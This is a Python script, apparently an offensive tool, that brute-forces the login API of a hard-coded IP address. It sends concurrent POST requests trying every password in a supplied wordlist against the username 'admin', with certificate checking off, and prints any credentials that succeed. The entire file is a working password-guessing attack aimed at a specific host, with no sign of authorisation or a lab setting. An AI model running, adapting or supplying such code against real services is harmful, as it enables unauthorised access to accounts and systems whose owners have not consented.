import asyncio, aiohttp, sys

URL = "http://38.127.47.105:8082/api/login"
user = "admin"
concurrency = 30

async def worker(sem, session, pwd):
    async with sem:
        try:
            async with session.post(URL, json={"username":user,"password":pwd}, timeout=10) as r:
                txt = await r.text()
                if r.status == 200:
                    print(f"[!] SUCCESS: {user}:{pwd}\nRESP: {txt}", flush=True)
                    return pwd
                return None
        except Exception as e:
            return None

async def main(wl):
    sem = asyncio.Semaphore(concurrency)
    conn = aiohttp.TCPConnector(limit=concurrency, ssl=False)
    async with aiohttp.ClientSession(connector=conn) as s:
        pwds = [l.strip() for l in wl if l.strip()]
        tasks = [asyncio.create_task(worker(sem, s, p)) for p in pwds]
        done = await asyncio.gather(*tasks)
    ok = [r for r in done if r]
    return ok

if __name__ == "__main__":
    wl = open(sys.argv[1]).read().splitlines()
    ok = asyncio.run(main(wl))
    print("RESULT:", ok if ok else "NO_CRACK")
